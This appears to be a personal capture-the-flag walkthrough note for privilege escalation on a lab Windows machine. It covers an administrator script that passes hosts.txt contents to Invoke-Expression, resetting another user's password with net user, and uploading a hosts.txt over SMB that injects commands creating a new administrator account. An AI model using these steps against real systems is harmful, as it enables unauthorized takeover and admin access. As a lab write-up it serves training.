You have a reverse shell on the third and final target.

Start with some manual enumeration and hopefully come up with something workable!

#Winrm_Shell 
If you do some recon manually you'll find  a directory called `scripts` with two files:

![[Enumeration-20250501104418383.webp]]

The most interesting one is a `powershell` script named ``checkservers.ps1`` that belong to `administrator`.

Looking into the code you find out:
1. The script reads a file named `hosts.txt` owned by `brittanycr`.
	`get-content C:\Users\brittanycr\hosts.txt`
2. The ps1 script is executed every x time consuming the hosts.txt file and passing it’s content to `Invoke-Expression`.
```
# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p     <====================

```


> [!NOTE] Note
> So if we gain access to `brittanycr` account by changing it’s password and changing the content of `hosts.txt` file to our payload, we can get it executed as `Administrator`


## Enumerate privileges

#Winrm_Shell 
Run the following command to the privilege of the current user:

```
whoami /priv
```

![[Enumeration-20250501102940688.webp]]
Look at the groups.


```
whoami /groups
```

![[Enumeration-20250501103711570.webp]]

According to Microsoft.

![[Enumeration-20250501103845862.webp]]

It means that we can change user passwords.
## Changing brittanycr‘s password

#Winrm_Shell 
```
net user brittanycr SuperPassword123
```

![[Enumeration-20250501110149062.webp]]

> [!Note]
> You won't be able to log in via Evil-winrm with these credentials.

## Login to SMB

#Attacking_Machine 
Try to login via SMB.

```
smbclient //windcorp.thm0/users -U brittanycr
```

![[Enumeration-20250501111220432.webp]]

Go to brittanycr's directory and list the files.

```
cd brittanycr
dir
```

![[Enumeration-20250501111545260.webp]]

## Changing the content of `hosts.txt`

#smbclient  
- Download the hosts.txt file.
```
get hosts.txt
```

#Attacking_Machine 
- Add a new user to hosts.txt.
```
net user robert P@ss123 /add; 
net localgroup Administrators robert /add
```

#smbclient 
- Upload the file.
```
mput hosts.txt
```

## crackmapexec

#Attacking_Machine 
Run crackmapexec.

```
cme winrm  fire.windcorp.thm -u robert -p P@ss123 
```
